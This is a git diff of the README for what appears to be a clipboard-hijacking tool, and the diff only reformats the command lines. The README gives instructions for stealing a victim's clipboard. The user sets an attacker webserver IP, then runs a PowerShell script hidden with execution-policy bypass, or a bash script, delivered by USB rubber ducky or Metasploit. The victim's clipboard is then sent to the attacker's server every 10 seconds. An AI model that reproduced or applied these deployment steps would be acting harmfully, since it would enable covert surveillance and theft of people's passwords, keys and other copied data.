@@ -24,12 +24,12 @@ python3 server.py
 change your webserver's IP address in clipboardhijacker.ps1 file & run this script using following command or other method like USB rubber ducky, metasploit command execution etc.
 
 ## 1. For Windows
-powershell -NoP -NonI -W h -Exec Bypass .\clipBoardHijacker.ps1
+#### powershell -NoP -NonI -W h -Exec Bypass .\clipBoardHijacker.ps1
 ## 2. For Linux
 ###   Dependencies: The Bash script requires xclip, curl, and jq, which are easily installed on most Linux distributions. On macOS, you can replace xclip with pbpaste and adjust the script accordingly.
    
-chmod +x clipBoardHijacker.sh
-./clipBoardHijacker.sh
+#### chmod +x clipBoardHijacker.sh
+#### ./clipBoardHijacker.sh
 
 After that your webserver will getting target machine clipboard data in every 10 sec.
 
